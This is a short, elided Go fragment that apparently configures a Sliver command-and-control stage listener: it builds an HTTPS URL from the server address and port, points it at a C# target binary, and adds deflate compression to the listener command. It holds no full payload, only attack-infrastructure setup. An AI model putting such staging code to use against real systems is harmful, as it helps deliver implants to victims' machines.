...
func main() {
	...
	urlStageListener := "https://" + config.SliverServer + ":" + config.StageListenerPort
	csharpURL := urlStageListener + "/" + config.CSharpTargetBinary
	...
	createStageListener += " -C deflate 9"
